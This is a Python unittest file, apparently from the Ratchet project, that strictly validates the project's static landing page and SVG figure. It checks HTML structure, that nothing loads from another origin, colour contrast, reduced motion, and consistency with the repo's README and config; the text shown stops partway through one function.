"""The landing page, docs/index.html, loads nothing from another origin and says only what the repo shows.

    python3 -m unittest discover -s checks -v

GitHub Pages serves docs/ from main as it stands, with no build step (docs/.nojekyll). The page is a test of this
repo, not a reference check. The test reads the page strictly and fails on what it does not know:

- the page is strict UTF-8, holds no control character but the newline and no character that reorders text, and
  starts with "<!DOCTYPE html>"
- html.parser reads it as well-formed: every element is one the page may hold, with only the attributes it may
  have, each once; every element that is opened is closed, in order; a void element is never closed; there is no
  comment, no processing instruction and no other declaration. There is no script, no frame, no form, no base,
  no style attribute and no event handler, because none of them is an element or an attribute the page may hold
- the page holds one picker, the one <fieldset class="tools"> (D-2026-11-25-prompt-per-tool): a <legend>, then for each
  coding agent of TOOLS, in order, an <input type="radio" name="tool"> with its id and a <label> for it, then one line
  for each, a <p class="where for-...">, and the CSS shows the line of the radio that is checked. The first radio is
  checked and no other. An <input> is such a radio and stands nowhere else, so it sends nothing anywhere: there is no
  form, no button and no other kind of input. A line that names the file its agent reads names a file that
  checks/init.py reads to choose adopt mode, INSTRUCTION_FILES, and says init.py sees it, or, for the one agent whose
  rules init.py does not see, names a path that is not in that list, says so and links to TRYING.md. The line of Claude
  Code also names AGENTS.md, the file that templates/CLAUDE.md, which init.py writes in a new repo, points at, and no
  line names any other file
- the page holds one prompt, the one <pre id="prompt" class="prompt">: the lines the test spells out, PROMPT_LINES, with
  the command that fetches Ratchet at the newest version with a date in CHANGELOG.md. Each of its lines that is a
  command, a line indented by three spaces, is a line of a code block marked sh in README.md, and the file it tells the
  agent to follow, STARTING.md, is in this checkout
- the page holds one inline SVG, the mark in the link to the repo: an <svg> that holds <path> and nothing else, no
  text, no other element of SVG and no element of the page, with only the attributes listed, whose values are numbers
  and words. So there is no script, use, image, foreignObject or animate in it, no href, no style attribute and no
  event handler. A <path> stands directly in an <svg> and nowhere else. Every other element of SVG is not an element
  the page may hold, so nothing
  comes in through one. The only <title> is the one in <head>
- the one figure is a file of its own, docs/ratchet-notch.svg, which one <img> loads, once, with alt text. The test
  reads that file as strictly as the page: strict UTF-8, no hidden character, no doctype, comment, processing
  instruction or reference, well-formed XML of seven elements of SVG, svg, style, g, rect, path, circle and text, each
  directly in the <svg> or in a <g>, and with only the attributes it may have, whose values are numbers and words. So there is
  no script, use, image, link or foreignObject in it, no href, no style attribute and no event handler. Its one
  <style> follows the rules of the page's CSS, and each color in it is the page's color of the same name
- nothing is loaded from another origin: what an element loads (img src, source srcset, link href) is the name of
  a file in docs/. The CSS in the one <style> element has no at-rule but @media and @keyframes, no function but
  var(), no backslash and no "url", so it loads nothing either
- the CSS moves the page only inside @media (prefers-reduced-motion: no-preference): an animation, a
  transition or scroll-behavior, also with a vendor prefix such as -webkit-, stands in that query, or in a
  @keyframes. A prefixed at-rule, such as @-webkit-keyframes, is not an at-rule the CSS may hold
- a link (a href) goes to a file in docs/, to an id on the page, or into the repo on GitHub: the repo itself, a
  file or a directory on main that exists in this checkout, a pull request, an issue, the list of issues, where a
  question is asked, or the latest release.
  Nothing links out of the repo to another site. A fragment on a link to the page, "#..." or "index.html#...", is
  an id on the page, and the ids on the page stand once each. A link to a logo has no fragment. A link into the
  repo may end in a fragment of the form of an id, and whether GitHub shows that id is not checked
- docs/ holds exactly the page, .nojekyll, the two logos and the figure, and each logo is byte for byte its copy
  in assets/
- the page has one h1, its headings do not skip a level, html has lang="en" and every image has alt text
- the colors are a palette of custom properties, one for light and one for dark, and each pair of text and
  background in it has a contrast ratio of at least 4.5 (WCAG 2, level AA). No other hex color is written.
- every command on the page, a line of a <pre><code> block, is a line of a code block marked sh in README.md
- each step of how Ratchet works, an item of the one <ol class="flow">, links to where the repo shows it
- what the one example says of its rule is what ratchet.json holds: each key the page names in <code> is a rule, the
  rule of the example names a secret scan in every PR, and while the page says Ratchet ships no scanner, the rule has
  no reference check
- the watch that the line of the sources calls daily is one schedule of one run a day in
  .github/workflows/watch-sources.yml, which runs checks/watch_sources.py on sources.json
- what the top of the page says of the project is what the repo holds: the sample of the dry run, the one
  <pre class="sample">, is the command of README.md and lines that checks/init.py --check prints in an empty repo,
  at the tag the page's clone command fetches, or at the head in the release of that version (the test is in
  test_init.py); while the page says "Before 1.0", the version of ratchet.json is below 1.0; and
  while it says the license is MIT, LICENSE starts "MIT License"
- the figure moves only as the page may: its animation stands in the query for no preference, so it is still for a
  visitor who asked for less motion, and the wheel turns one tooth for each principle, at the angle of one tooth
- the page is short: under 1100 words outside the CSS, with one h1 and four h2, and one link of the class button
- the principles, the one <section id="principles">, are the titles of the principles of ratchet.json, in order, in
  lists numbered from 1 on, with the two lines values.json gives around them, and the figure has one numbered tooth
  for each principle. The test reads the section and the figure itself, and does not ask generate.py
- the story and the values, the one <section id="values">, show the story, the line that leads to the values, each
  value and the line that weighs them, as values.json holds them, in order, with the part each marks. The test reads
  the section itself, and does not ask generate.py.

Six parts of the page are written by generate.py, which checks them: the line that fetches Ratchet, which names
the newest version with a date in CHANGELOG.md, as the command in README.md does; the line that counts the rules
of the core, from ratchet.json; the story and the values, from values.json; the line that names the pinned
sources, from sources.json; the principles, from ratchet.json and values.json; and the prompt, which holds the same
command at the same version. So a release that moves the README, a rule that changes kind, a value that is changed
and a source that is added each move the page when generate.py is run, and generate.py --check fails until it is.
The tests of all six are here too, and they read each line as generate.py
does, after the spaces that indent it, and the lines of the prompt as they stand. The principles are a link to RATCHET.md, not a list on the page
(D-2026-11-23-values-and-principles).

What the test does not claim: that a browser shows the page or the figure as intended, that an agent does what the
prompt asks, that a coding agent reads the file the page says it reads, or that Ratchet works in any of them, that the figure's labels fit
where they are drawn or that each lies on the background it is checked against, that a named color is legible (it
reads hex colors only), that the border of a box stands out from the background (--edge is not checked: a box says
nothing that its text and its place in the list do not), or that the text is true. The text is taken
from README.md and the files the page links to, and read by the maintainer. That
Pages is turned on is a setting of the repository. Each case is the page with one change, so the cases follow the
page when it changes. Standard library only.
"""

import html.parser
import json
import os
import re
import shutil
import sys
import unittest
import xml.etree.ElementTree

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import generate  # noqa: E402
import init  # noqa: E402
import registry  # noqa: E402
from test_checks import ROOT, RepoCopy, first_entry, run  # noqa: E402

DOCS = "docs"
PAGE = "index.html"
REPO = "https://github.com/fabian-von-tiedemann/ratchet"
FETCH = "git clone --branch v%s https://github.com/fabian-von-tiedemann/ratchet .ratchet"
# Every file in docs/. A logo is a copy of the file of the same name in assets/.
FILES = (".nojekyll", "index.html", "ratchet-dark.svg", "ratchet-light.svg", "ratchet-notch.svg")
LOGOS = ("ratchet-dark.svg", "ratchet-light.svg")
# The one figure, which one <img> on the page loads, and every element it may hold, with the attributes it may have.
# Each stands directly in the <svg> or in a <g>, which groups what the animation turns. There is no id, no href, no style attribute and no attribute of a color: the
# colors are in the one <style>. A value is numbers and words, so it calls no function and names no file.
FIGURE = "ratchet-notch.svg"
SVG = "http://www.w3.org/2000/svg"
FIGURE_ELEMENTS = {
    "svg": {"viewBox", "width", "height", "role", "aria-label"}, "style": set(),
    "g": {"class"}, "rect": {"class", "x", "y", "width", "height", "rx"}, "path": {"class", "d"}, "circle": {"class", "cx", "cy", "r"},
    "text": {"class", "x", "y", "text-anchor"},
}
FIGURE_VALUE = re.compile(r"[A-Za-z0-9 .,-]+\Z")
# What the figure may not hold anywhere, since each is a way to bring in what the XML parser would not show as an element.
FIGURE_MARKS = (("<!", "a doctype, a comment or a CDATA section"), ("<?", "a processing instruction"),
                ("&", "a character reference or an entity"))
VOID = {"meta", "link", "img", "source", "br", "input"}
GLOBAL = {"id", "class"}
# Every element the page may hold, with the attributes it may have beside id and class.
ELEMENTS = {
    "html": {"lang"}, "head": set(), "meta": {"charset", "name", "content"}, "title": set(), "link": {"rel", "href", "type"},
    "style": set(), "body": set(), "header": set(), "nav": set(), "main": set(), "section": set(), "footer": set(),
    "h1": set(), "h2": set(), "h3": set(), "p": set(), "ul": set(), "ol": {"start"}, "li": set(), "a": {"href"},
    "strong": set(), "em": set(), "code": set(), "pre": set(), "br": set(), "span": set(),
    "picture": set(), "source": {"media", "srcset"}, "img": {"src", "width", "height", "alt"},
    "fieldset": set(), "legend": set(), "input": {"type", "name", "checked"}, "label": {"for"},
    "svg": {"viewbox", "width", "height", "aria-hidden"}, "path": {"d"},
}
# The inline SVG of the page, the mark in the link to the repo: an <svg> holds only these elements, each directly in
# it, and they stand nowhere else. html.parser gives the names of elements and attributes in lower case. A value of
# an attribute in an <svg> is numbers and words, as in the figure. The page holds INLINE of them.
SVG_INNER = {"path"}
INLINE = 1
# What an element loads: the attribute that names a file.
LOADS = {("img", "src"), ("source", "srcset"), ("link", "href")}
META = {"viewport", "description", "color-scheme"}
FILE = re.compile(r"[a-z0-9][a-z0-9.-]*\Z")
FRAGMENT = re.compile(r"#[a-z0-9]+(?:-[a-z0-9]+)*\Z")
# A path on main: parts that may start with one dot, as .github does, so no part is "." or "..".
REPO_PATH = re.compile(r"(?:\.?[A-Za-z0-9_][A-Za-z0-9_.-]*/)*\.?[A-Za-z0-9_][A-Za-z0-9_.-]*")
REPO_LINK = re.compile(
    r"(?:(?:/(?P<kind>blob|tree)/main/(?P<path>%s)|/(?:pull|issues)/[1-9][0-9]*|/releases/latest)?(?:#[a-z0-9]+(?:-[a-z0-9]+)*)?|/issues)\Z"
    % REPO_PATH.pattern
)
# Characters the page may not hold: controls but the newline, and the ones that reorder or hide text.
HIDDEN = re.compile("[\x00-\x09\x0b-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff]")
CSS_FUNCTION = re.compile(r"([A-Za-z_-][A-Za-z0-9_-]*)\(")
CSS_AT = re.compile(r"@([A-Za-z-]+)")
HEX = re.compile(r"#[0-9A-Fa-f]{3,8}\b")
PALETTE = re.compile(r"--([a-z]+(?:-[a-z]+)*):\s*(#[0-9a-f]{6});")
ROOT_BLOCK = re.compile(r":root\s*\{([^{}]*)\}")
DARK = "@media (prefers-color-scheme: dark)"
# The only query in which the CSS may move the page: a visitor who asked for less motion sees none.
REDUCED = "@media (prefers-reduced-motion: no-preference)"
AT_RULES = {"media", "keyframes"}
# A property that moves the page, an animation, a transition or smooth scrolling, with or without a vendor prefix such as -webkit-, -moz-, -o- or -ms-: any one word
# between dashes before the name counts as one. A prefixed at-rule, such as @-webkit-keyframes, is not in AT_RULES.
MOTION = re.compile(r"(?:-[a-z]+-)?(?:animation(?:-[a-z]+)*|transition(?:-[a-z]+)*|scroll-behavior)\Z")
# Pairs of text and background in the palette, each to have a contrast ratio of at least 4.5. The button is the
# background on the accent, and on the text color when the pointer is over it: the pairs of accent and bg, and of fg
# and bg, turned around, with the same ratio. --shadow is the shadow of the button, and no text stands on it.
PAIRS = (("fg", "bg"), ("muted", "bg"), ("link", "bg"), ("fg", "code-bg"), ("code-fg", "code-bg"), ("fg", "box"), ("muted", "box"),
         ("link", "box"), ("accent", "bg"), ("accent", "box"))
# The pairs in the figure: its labels on its own background, and the numbers on the wheel, --ink on --signal, two colors
# the page's palette holds for the figure. The figure does not use the accent, which stands only on what is clicked.
FIGURE_PAIRS = (("fg", "box"), ("muted", "box"), ("ink", "signal"))
# The one example on the page: the rule it names, the start of that rule's ratchet in ratchet.json, which the example
# says in its own words, and the line that says Ratchet ships no check for it, which holds while the rule has no
# reference check.
EXAMPLE_KEY = "ratchet.no-secrets"
EXAMPLE_CHECK = "Check: a secret scan in every PR"
EXAMPLE_NOT_SHIPPED = "Ratchet ships no scanner"
PAGE_KEY = re.compile(r"<code>(ratchet\.[a-z0-9-]+)</code>")
# The watch that the line of the sources calls daily: one schedule of one run a day, which runs the watch on sources.json.
WATCH = ".github/workflows/watch-sources.yml"
WATCH_CRON = re.compile(r'    - cron: "(?:[0-9]|[1-5][0-9]) (?:[0-9]|1[0-9]|2[0-3]) \* \* \*"\Z')
WATCH_RUN = "        run: python3 checks/watch_sources.py --data sources.json"
# The list whose items the test reads one by one: the steps of how Ratchet works.
ITEM_LISTS = {"ol": "flow"}
CONTRAST = 4.5
# The page is short: fewer words than this outside the CSS, these headings, and one link of the class button, the one
# thing to do (D-2026-11-24-landing-page-pass). The cap was 450, then 400, then 560 before the principles were listed,
# then 780 before the picker and the prompt (D-2026-11-25-prompt-per-tool).
WORDS = 1100
HEADINGS = [1, 2, 2, 2, 2]
BUTTON = '<a class="button" href="#start-here">Try it on your repo</a>'
# What the top of the page says of the project, each tied to what the repo holds.
BEFORE_ONE = "Before 1.0"
LICENSED = '<strong>License:</strong> <a href="%s/blob/main/LICENSE">MIT</a>.' % REPO
SAMPLE = re.compile(r'<pre class="sample">([^<>]*)</pre>')
# The picker (D-2026-11-25-prompt-per-tool): each coding agent as (the end of its id and of its line's class, its name
# on the page, the file the page says it reads, whether checks/init.py sees that file, that is, whether it is one of
# init.INSTRUCTION_FILES). The last is every other agent, and names no file. The picker says of no agent that the prompt
# was tried in it: a test cannot see that, and the line under the prompt says which two it was tried in.
TOOLS = (("claude-code", "Claude Code", "CLAUDE.md", True), ("codex", "Codex", "AGENTS.md", True),
         ("gemini-cli", "Gemini CLI", "GEMINI.md", True), ("cursor", "Cursor", ".cursor/rules", False),
         ("copilot", "GitHub Copilot", ".github/copilot-instructions.md", True), ("other", "Other", None, None))
# A file a line may name beside its agent's own, by the end of its id: in a new repo init.py writes CLAUDE.md, from
# templates/CLAUDE.md, and that file points Claude Code at AGENTS.md, as POINTS_AT is.
ALSO_NAMED = {"claude-code": "AGENTS.md"}
POINTS_AT = "\n@AGENTS.md\n"
PICKER = "tools"
RADIO = {"type": "radio", "name": "tool"}
SEES = "<code>init.py</code> sees that file and never changes it"
NOT_SEEN = "which <code>init.py</code> does not see"
INVENTORY_FIRST = '<a href="%s/blob/main/TRYING.md">take inventory first</a>' % REPO
SHOWN = "#tool-%s:checked ~ .for-%s"
PANEL_CODE = re.compile(r"<code>([^<>]*)</code>")
# The prompt, as the test expects it, spelled out here and not taken from generate.py. Its one "%s" is FETCH at the
# newest version with a date in CHANGELOG.md. A line indented by three spaces is a command.
PROMPT_OPEN, PROMPT_CLOSE = '<pre id="prompt" class="prompt">', "</pre>"
PROMPT_LINES = (
    "Set up Ratchet in this git repo. Work in the repo's root.",
    "",
    "1. Fetch Ratchet at its released tag into .ratchet:",
    "   %s",
    "2. Run the dry run, which writes nothing, and show me all of its output:",
    "   python3 .ratchet/checks/init.py --check",
    "3. Stop there. Tell me which of the two paths init.py takes here: a new repo, or adopt mode, for a repo with an "
    "instruction file of its own. Ask me before you run anything that writes: init.py, or init.py with --adopt.",
    "4. When I have said yes, follow .ratchet/STARTING.md, one step at a time.",
    "5. If init.py wrote AGENTS.md and you do not read it, say how to make you.",
    "",
    "Do not commit, push, or make a check required without asking me first.",
)
PROMPT_FOLLOWS = "STARTING.md"


class PageReader(html.parser.HTMLParser):
    """Reads the page and collects what is wrong with its form, what it loads and links to, its ids and commands."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problems = []
        self.stack = []
        self.seen_doctype = False
        self.started = False
        self.loads, self.links, self.ids, self.headings, self.images = [], [], [], [], []
        self.commands, self.styles, self.counts = [], [], {}
        self.text_in = None
        # The classes of each open element, beside self.stack. An item of a list in ITEM_LISTS, a <li> whose list has
        # that class, records the links in it with their text. Each capture is [depth, field, href, parts], and ends
        # when its element is closed.
        self.classes, self.items, self.captures = [], [], []
        self.item, self.item_at = None, None
        # Each list on the page, as (its tag, the classes of its class attribute), in order.
        self.lists = []
        self.head_titles = 0

    def where(self):
        return "line %d" % self.getpos()[0]

    def handle_decl(self, decl):
        if decl != "DOCTYPE html" or self.started or self.seen_doctype:
            self.problems.append("%s: the only declaration is <!DOCTYPE html>, first, found <!%s>" % (self.where(), decl))
        self.seen_doctype = True

    def handle_starttag(self, tag, attrs):
        self.start(tag, attrs, closed=False)

    def handle_startendtag(self, tag, attrs):
        self.start(tag, attrs, closed=True)

    def start(self, tag, attrs, closed):
        self.started = True
        table = ELEMENTS
        if tag not in table:
            self.problems.append("%s: <%s> is not an element this page may hold" % (self.where(), tag))
        inside = "svg" in self.stack
        if tag in SVG_INNER and self.stack[-1:] != ["svg"]:
            self.problems.append("%s: <%s> stands directly in an <svg>, and nowhere else" % (self.where(), tag))
        elif inside and tag not in SVG_INNER:
            self.problems.append("%s: an <svg> holds only %s, found <%s>"
                                 % (self.where(), ", ".join("<%s>" % each for each in sorted(SVG_INNER)), tag))
        if tag == "svg" or inside:
            for name, value in attrs:
                if value is not None and not FIGURE_VALUE.match(value):
                    self.problems.append("%s: <%s> has %s=%r, and a value in an <svg> is numbers and words" % (self.where(), tag, name, value))
        if closed and tag not in VOID:
            self.problems.append("%s: <%s/> is not closed by its slash, only a void element may end so" % (self.where(), tag))
        self.counts[tag] = self.counts.get(tag, 0) + 1
        names = [name for name, _ in attrs]
        values = {}
        for name, value in attrs:
            if names.count(name) > 1 and name not in values:
                self.problems.append("%s: <%s> has the attribute %s twice" % (self.where(), tag, name))
            values.setdefault(name, value)
            if name not in GLOBAL and name not in table.get(tag, set()):
                self.problems.append("%s: <%s> may not have the attribute %s" % (self.where(), tag, name))
            elif value is None:
                self.problems.append("%s: <%s> has the attribute %s without a value" % (self.where(), tag, name))
            elif (tag, name) in LOADS:
                self.loads.append((self.where(), tag, value))
            elif (tag, name) == ("a", "href"):
                self.links.append((self.where(), value))
            elif name == "id":
                self.ids.append(value)
        if tag == "html" and values.get("lang") != "en":
            self.problems.append('%s: <html> must have lang="en"' % self.where())
        if tag == "meta" and not (values == {"charset": "utf-8"} or (set(values) == {"name", "content"} and values["name"] in META)):
            self.problems.append('%s: a <meta> is charset="utf-8", or a name among %s with content' % (self.where(), ", ".join(sorted(META))))
        if tag == "link" and (values.get("rel") != "icon" or "href" not in values):
            self.problems.append('%s: the only <link> is rel="icon" with an href' % self.where())
        if tag == "a" and "href" not in values:
            self.problems.append("%s: an <a> has an href" % self.where())
        if tag == "img":
            self.images.append((self.where(), values.get("alt")))
        if tag == "title":
            if self.stack[-1:] == ["head"]:
                self.head_titles += 1
            else:
                self.problems.append("%s: a <title> stands in <head>, and nowhere else" % self.where())
        if tag == "source" and self.stack[-1:] != ["picture"]:
            self.problems.append("%s: a <source> stands in a <picture>" % self.where())
        if tag in ("input", "label", "legend") and self.stack[-1:] != ["fieldset"]:
            self.problems.append("%s: <%s> stands directly in the <fieldset> of the picker, and nowhere else" % (self.where(), tag))
        if tag == "input" and (dict((name, value) for name, value in values.items() if name in RADIO) != RADIO
                               or values.get("checked", "checked") != "checked"):
            self.problems.append('%s: an <input> is a radio of the picker, type="radio" and name="tool", and no other kind, and '
                                 'checked is written checked="checked"' % self.where())
        if re.fullmatch(r"h[1-6]", tag):
            self.headings.append((self.where(), int(tag[1])))
        if tag == "code" and self.stack[-1:] == ["pre"]:
            self.text_in = []
        classes = (values.get("class") or "").split()
        if tag in ITEM_LISTS:
            self.lists.append((tag, classes))
        if tag == "li" and self.stack and ITEM_LISTS.get(self.stack[-1]) in self.classes[-1]:
            self.item = {"list": ITEM_LISTS[self.stack[-1]], "where": self.where(), "links": []}
            self.items.append(self.item)
            self.item_at = len(self.stack)
        elif self.item is not None and tag not in VOID:
            if tag == "a":
                self.captures.append([len(self.stack), "links", values.get("href"), []])
        if tag not in VOID:
            self.stack.append(tag)
            self.classes.append(classes)

    def handle_endtag(self, tag):
        if tag in VOID:
            self.problems.append("%s: </%s> closes a void element" % (self.where(), tag))
            return
        if not self.stack or self.stack[-1] != tag:
            self.problems.append("%s: </%s> does not close the element that is open, %s"
                                 % (self.where(), tag, "<%s>" % self.stack[-1] if self.stack else "none"))
            if tag in self.stack:
                at = self.stack.index(tag)
                del self.stack[at:], self.classes[at:]
                self.close_items()
            return
        self.stack.pop()
        self.classes.pop()
        self.close_items()
        if tag == "code" and self.text_in is not None:
            self.commands += "".join(self.text_in).split("\n")
            self.text_in = None

    def close_items(self):
        """End the captures and the item whose elements are no longer open."""
        while self.captures and self.captures[-1][0] >= len(self.stack):
            _, field, href, parts = self.captures.pop()
            text = " ".join("".join(parts).split())
            self.item[field].append((href, text))
        if self.item is not None and self.item_at >= len(self.stack):
            self.item, self.item_at = None, None

    def handle_data(self, data):
        if data.strip():
            self.started = True
            if "svg" in self.stack:
                self.problems.append("%s: text in an <svg>, which holds no text" % self.where())
        for capture in self.captures:
            capture[3].append(data)
        if self.text_in is not None:
            self.text_in.append(data)
        if self.stack[-1:] == ["style"]:
            self.styles.append(data)

    def handle_comment(self, data):
        self.problems.append("%s: a comment, which the page does not hold" % self.where())

    def handle_pi(self, data):
        self.problems.append("%s: a processing instruction, which the page does not hold" % self.where())

    def unknown_decl(self, data):
        self.problems.append("%s: a declaration <![%s]>, which the page does not hold" % (self.where(), data))


def luminance(color):
    channels = []
    for at in (1, 3, 5):
        value = int(color[at:at + 2], 16) / 255
        channels.append(value / 12.92 if value <= 0.04045 else ((value + 0.055) / 1.055) ** 2.4)
    return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2]


def contrast(one, other):
    high, low = sorted((luminance(one), luminance(other)), reverse=True)
    return (high + 0.05) / (low + 0.05)


def css_problems(css, pairs=PAIRS):
    problems = []
    if "\\" in css:
        problems.append("the CSS holds a backslash, which could spell a word the check does not see")
    if "url" in css.lower():
        problems.append('the CSS holds "url", and loads nothing')
    for name in sorted(set(CSS_FUNCTION.findall(css)) - {"var"}):
        problems.append("the CSS calls %s(), and the only function it may call is var()" % name)
    for name in sorted(set(CSS_AT.findall(css)) - AT_RULES):
        problems.append("the CSS holds @%s, and the only at-rules it may hold are @media and @keyframes" % name)
    problems += motion_problems(css)
    blocks = ROOT_BLOCK.findall(css)
    dark = css.find(DARK)
    roots = [match.start() for match in ROOT_BLOCK.finditer(css)]
    if len(blocks) != 2 or dark < 0 or not (roots[0] < dark < roots[1]):
        problems.append("the CSS has two :root blocks of colors, the first for light and the second inside %s" % DARK)
        return problems
    palettes = [dict(PALETTE.findall(block)) for block in blocks]
    if sum(len(PALETTE.findall(block)) for block in blocks) != len(HEX.findall(css)):
        problems.append("the CSS writes a hex color outside the two palettes, or one that is not #rrggbb in lower case")
    for scheme, palette in zip(("light", "dark"), palettes):
        for text, background in pairs:
            if text not in palette or background not in palette:
                problems.append("the %s palette has no --%s or no --%s" % (scheme, text, background))
                continue
            ratio = contrast(palette[text], palette[background])
            if ratio < CONTRAST:
                problems.append("in the %s palette, --%s on --%s has a contrast ratio of %.2f, under %.1f"
                                % (scheme, text, background, ratio, CONTRAST))
    if set(palettes[0]) != set(palettes[1]):
        problems.append("the light and the dark palette name different colors")
    return problems


def motion_problems(css):
    """Why the CSS moves the page for a visitor who asked for less motion: an animation outside the query REDUCED.

    The CSS is read as blocks, each opened by what stands before its "{". A declaration of animation, of a property
    animation-*, of transition, of a property transition-*, or of scroll-behavior, with or without a vendor prefix,
    stands in a block inside REDUCED, written so, or inside a @keyframes, which only says how an animation moves. Comments are removed
    first, so a brace in a comment is not read, but a brace in a string is read as a brace.
    """
    problems, blocks, start = [], [], 0
    css = re.sub(r"/\*.*?\*/", "", css, flags=re.S)
    for at, char in enumerate(css):
        if char not in "{};":
            continue
        text, start = " ".join(css[start:at].split()), at + 1
        if char == "{":
            blocks.append(text)
            continue
        name = text.partition(":")[0].strip().lower()
        if blocks and ":" in text and MOTION.match(name) and not any(block == REDUCED or block.startswith("@keyframes ") for block in blocks):
            problems.append("the CSS declares %s in %s, and so moves the page outside %s" % (name, " ".join(blocks), REDUCED))
        if char == "}":
            if not blocks:
                problems.append("the CSS has a brace that is not matched: a } with no block open")
                continue
            blocks.pop()
    if blocks:
        problems.append("the CSS has a brace that is not matched: %s is never closed" % blocks[-1])
    return problems


def palettes(css):
    """The light and the dark palette of a CSS that css_problems passed, each as a dict of name and color."""
    return [dict(PALETTE.findall(block)) for block in ROOT_BLOCK.findall(css)]


def figure_problems(root, page_css):
    """Everything wrong with the figure in the checkout at root, as a list of messages that name the file.

    page_css is the CSS of the page, whose palettes the figure's colors are taken from.
    """
    name = "%s/%s" % (DOCS, FIGURE)
    path = os.path.join(root, DOCS, FIGURE)
    if os.path.islink(path) or not os.path.isfile(path):
        return ["%s: there is no such file" % name]
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        text = data.decode("utf-8", errors="strict")
    except UnicodeDecodeError as error:
        return ["%s: not valid UTF-8 at byte %d" % (name, error.start)]
    problems = []
    for number, line in enumerate(text.split("\n"), 1):
        for match in HIDDEN.finditer(line):
            problems.append("%s:%d: holds U+%04X, a control or a character that reorders or hides text" % (name, number, ord(match.group())))
    for mark, what in FIGURE_MARKS:
        if mark in text:
            problems.append("%s: holds %r, %s, which the figure does not hold" % (name, mark, what))
    if problems:
        # A doctype is never given to the parser, so it expands no entity.
        return problems
    try:
        tree = xml.etree.ElementTree.fromstring(text)
    except xml.etree.ElementTree.ParseError as error:
        return ["%s: not well-formed XML: %s" % (name, error)]
    styles = []
    for element in tree.iter():
        space, _, tag = element.tag.rpartition("}")
        if space != "{" + SVG or tag not in FIGURE_ELEMENTS or (tag == "svg") != (element is tree):
            problems.append("%s: <%s> is not an element the figure may hold" % (name, element.tag))
            continue
        for attribute, value in element.attrib.items():
            if attribute not in FIGURE_ELEMENTS[tag]:
                problems.append("%s: <%s> may not have the attribute %s" % (name, tag, attribute))
            elif not FIGURE_VALUE.match(value):
                problems.append("%s: <%s> has %s=%r, and a value in the figure is numbers and words" % (name, tag, attribute, value))
        if element is not tree and tag != "g" and len(element):
            problems.append("%s: <%s> holds an element, and only the <svg> and a <g> hold elements" % (name, tag))
        words = [element.tail] + ([] if tag in ("style", "text") else [element.text])
        if any(each and each.strip() for each in words):
            problems.append("%s: text in or after <%s>, and the figure holds text only in <text> and <style>" % (name, tag))
        if tag == "style":
            styles.append(element.text or "")
    if tree.get("role") != "img" or not tree.get("aria-label"):
        problems.append('%s: the <svg> has role="img" and an aria-label that names it' % name)
    if len(styles) != 1:
        return problems + ["%s: holds <style> %d times, and must hold it once" % (name, len(styles))]
    found = css_problems(styles[0], FIGURE_PAIRS)
    if not found and len(palettes(page_css)) == 2:
        for scheme, own, pages in zip(("light", "dark"), palettes(styles[0]), palettes(page_css)):
            for key, color in sorted(own.items()):
                if pages.get(key) != color:
                    found.append("in the %s palette, --%s is %s, and the page's is %s: the figure has the colors of the page"
                                 % (scheme, key, color, pages.get(key, "not there")))
        if not found and any("accent" in palette for palette in palettes(styles[0])):
            found.append("the figure names --accent, which stands only on what is clicked")
    return problems + ["%s: %s" % (name, problem) for problem in found]


def readme_commands(readme):
    """Every line of a code block marked sh in README.md, without the spaces that indent it."""
    lines, language = set(), None
    for line in readme.split("\n"):
        bare = line.lstrip(" ")
        if bare.startswith("```"):
            language = bare[3:] if language is None else None
        elif language == "sh":
            lines.add(bare)
    return lines


def page_problems(root):
    """Everything wrong with docs/ in the checkout at root, as a list of messages that name the file."""
    docs = os.path.join(root, DOCS)
    name = "%s/%s" % (DOCS, PAGE)
    if not os.path.isdir(docs):
        return ["%s/: there is no such directory" % DOCS]
    problems = []
    present = sorted(os.listdir(docs))
    if tuple(present) != FILES:
        problems.append("%s/ must hold exactly %s, found %s" % (DOCS, ", ".join(FILES), ", ".join(present) or "nothing"))
    for logo in LOGOS:
        paths = os.path.join(docs, logo), os.path.join(root, "assets", logo)
        if all(os.path.isfile(path) and not os.path.islink(path) for path in paths):
            with open(paths[0], "rb") as one, open(paths[1], "rb") as other:
                if one.read() != other.read():
                    problems.append("%s/%s is not byte for byte assets/%s" % (DOCS, logo, logo))
    path = os.path.join(docs, PAGE)
    if os.path.islink(path) or not os.path.isfile(path):
        return problems + ["%s: there is no such file" % name]
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        text = data.decode("utf-8", errors="strict")
    except UnicodeDecodeError as error:
        return problems + ["%s: not valid UTF-8 at byte %d" % (name, error.start)]
    for number, line in enumerate(text.split("\n"), 1):
        for match in HIDDEN.finditer(line):
            problems.append("%s:%d: holds U+%04X, a control or a character that reorders or hides text" % (name, number, ord(match.group())))
    if not text.startswith("<!DOCTYPE html>\n"):
        problems.append("%s: does not start with <!DOCTYPE html> and a newline" % name)

    reader = PageReader()
    reader.feed(text)
    reader.close()
    found = ["%s: %s" % (name, problem) for problem in reader.problems]
    if reader.stack:
        found.append("%s: elements opened and never closed: %s" % (name, ", ".join("<%s>" % tag for tag in reader.stack)))
    if reader.rawdata:
        found.append("%s: html.parser did not read the end of the page" % name)
    for tag in ("html", "head", "body", "main", "h1", "style"):
        if reader.counts.get(tag, 0) != 1:
            found.append("%s: holds <%s> %d times, and must hold it once" % (name, tag, reader.counts.get(tag, 0)))
    if reader.counts.get("svg", 0) != INLINE:
        found.append("%s: holds <svg> %d times, and must hold it %d times: the mark in the link to the repo"
                     % (name, reader.counts.get("svg", 0), INLINE))
    if reader.head_titles != 1:
        found.append("%s: holds <title> %d times in <head>, and must hold it once" % (name, reader.head_titles))
    level = 0
    for where, heading in reader.headings:
        if heading > level + 1:
            found.append("%s: %s: <h%d> after <h%d> skips a level" % (name, where, heading, level))
        level = heading
    if reader.headings[:1] and reader.headings[0][1] != 1:
        found.append("%s: the first heading is not <h1>" % name)
    for where, alt in reader.images:
        if not alt or not alt.strip():
            found.append("%s: %s: an <img> without alt text" % (name, where))
    for where, tag, value in reader.loads:
        if not FILE.match(value) or value not in FILES or value == ".nojekyll":
            found.append("%s: %s: <%s> loads %r, and the page loads only a file in %s/ by its name" % (name, where, tag, value, DOCS))
    figures = ["<%s>" % tag for _, tag, value in reader.loads if value == FIGURE]
    if figures != ["<img>"]:
        found.append("%s: the figure %s is loaded by %s, and one <img> loads it, once" % (name, FIGURE, ", ".join(figures) or "nothing"))
